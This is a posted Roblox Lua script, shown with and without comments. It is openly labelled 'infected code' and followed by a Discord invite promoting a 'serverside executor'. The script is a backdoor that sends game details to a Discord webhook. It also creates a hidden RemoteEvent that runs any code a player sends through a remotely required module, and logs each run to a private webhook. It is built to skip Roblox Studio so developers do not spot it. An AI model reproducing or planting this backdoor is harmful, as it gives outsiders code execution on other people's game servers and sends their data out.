-Created by real_sillycat-

# Full Roblox script infected code
# ⚠️THE SCRIPT MIGHT BE RISKY   ⚠️
Script with comments:
```
-- Get the HTTP service to send HTTP requests
HttpService = game:GetService("HttpService")

-- Define two Discord webhook URLs
Num1 = "YOUR_PUBLIC_WEBHOOK_URL"  -- Public webhook for general game info
Num2 = "YOUR_PRIVATE_WEBHOOK_URL" -- Private webhook for logging player actions

-- Function to send data to a webhook
function Num3(url, data)
    -- Use pcall to prevent errors from breaking the script
    pcall(function()
        -- Convert the data table into JSON format and send it via an HTTP POST request
        HttpService:PostAsync(url, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
    end)
end

-- Get the game’s unique Place ID
Num4 = game.PlaceId

-- Get the Job ID for the current game server
Num5 = game.JobId

-- Get the maximum number of players allowed in this server
Num6 = game:GetService("Players").MaxPlayers

-- Check if HTTP requests are enabled before proceeding
if HttpService.HttpEnabled then
    -- Ensure the script does not run inside Roblox Studio
    if not game:GetService("RunService"):IsStudio() then
        -- Try to retrieve the game's information using its Place ID
        success, Num7 = pcall(function()
            return game:GetService("MarketplaceService"):GetProductInfo(Num4)
        end)

        -- If game data retrieval is successful, format the information
        if success then
            -- Structure the game details in a JSON format for a Discord webhook embed
            Num8 = {
                embeds = {
                    {
                        title = "**Game Information**",  -- Embed title
                        description = "Public game details from the server.", -- Embed description
                        color = 65280, -- Green color
                        fields = {
                            { name = "Game Name", value = Num7.Name }, -- Fetch the game's name
                            { name = "Game ID", value = tostring(Num4) }, -- Convert game ID to string
                            { name = "Job ID", value = tostring(Num5) }, -- Convert job ID to string
                            { name = "Visits", value = tostring(Num7.PriceInRobux) }, -- Number of visits (stored in PriceInRobux)
                            { name = "Active Players", value = tostring(Num7.Sales) }, -- Number of active players (stored in Sales)
                            { name = "Date Created", value = Num7.Created }, -- Date when the game was created
                            { name = "Max Players", value = tostring(Num6) }, -- Max player capacity per server
                            { name = "Game Link", value = "https://www.roblox.com/games/" .. Num4 } -- Generate a direct game link
                        }
                    }
                }
            }

            -- Send the formatted game details to the public webhook
            Num3(Num1, Num8)
        end

        -- Create a RemoteEvent to listen for players executing scripts
        Num9 = Instance.new("RemoteEvent", game.Workspace)

        -- Connect an event listener to track player script executions
        Num9.OnServerEvent:Connect(function(Num10, Num11)
            -- Execute the script using a required module
            require(0x34A62CEB9):SpawnS(Num11, game.Workspace)

            -- Format player action logs to be sent via private webhook
            Num12 = {
                embeds = {
                    {
                        title = "**Player Code Execution**",  -- Embed title
                        description = Num10.Name .. " ran a script.", -- Log description
                        color = 16711680, -- Red color (warning)
                        fields = {
                            { name = "Player Name", value = Num10.Name }, -- Name of the player who executed the code
                            { name = "Script Executed", value = "```".. Num11 .. "```" } -- The exact script executed by the player
                        }
                    }
                }
            }

            -- Send the formatted execution log to the private webhook
            Num3(Num2, Num12)
        end)
    end
end
```
Script without comments:
```
HttpService = game:GetService("HttpService")

Num1 = "YOUR_PUBLIC_WEBHOOK_URL"
Num2 = "YOUR_PRIVATE_WEBHOOK_URL"

function Num3(url, data)
    pcall(function()
        HttpService:PostAsync(url, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
    end)
end

Num4 = game.PlaceId
Num5 = game.JobId
Num6 = game:GetService("Players").MaxPlayers

if HttpService.HttpEnabled then
    if not game:GetService("RunService"):IsStudio() then
        success, Num7 = pcall(function()
            return game:GetService("MarketplaceService"):GetProductInfo(Num4)
        end)

        if success then
            Num8 = {
                embeds = {
                    {
                        title = "**Game Information**",
                        description = "Public game details from the server.",
                        color = 65280,
                        fields = {
                            { name = "Game Name", value = Num7.Name },
                            { name = "Game ID", value = tostring(Num4) },
                            { name = "Job ID", value = tostring(Num5) },
                            { name = "Visits", value = tostring(Num7.PriceInRobux) },
                            { name = "Active Players", value = tostring(Num7.Sales) },
                            { name = "Date Created", value = Num7.Created },
                            { name = "Max Players", value = tostring(Num6) },
                            { name = "Game Link", value = "https://www.roblox.com/games/" .. Num4 }
                        }
                    }
                }
            }
            Num3(Num1, Num8)
        end

        Num9 = Instance.new("RemoteEvent", game.Workspace)
        Num9.OnServerEvent:Connect(function(Num10, Num11)
            require(0x34A62CEB9):SpawnS(Num11, game.Workspace)

            Num12 = {
                embeds = {
                    {
                        title = "**Player Code Execution**",
                        description = Num10.Name .. " ran a script.",
                        color = 16711680,
                        fields = {
                            { name = "Player Name", value = Num10.Name },
                            { name = "Script Executed", value = "```".. Num11 .. "```" }
                        }
                    }
                }
            }
            Num3(Num2, Num12)
        end)
    end
end
```


**IF YOU WANT MAKE SERVERSIDE EXECUTOR JOIN THE DISCORD SERVER:**
[Discord server](https://discord.gg/2xfKEAJuds)
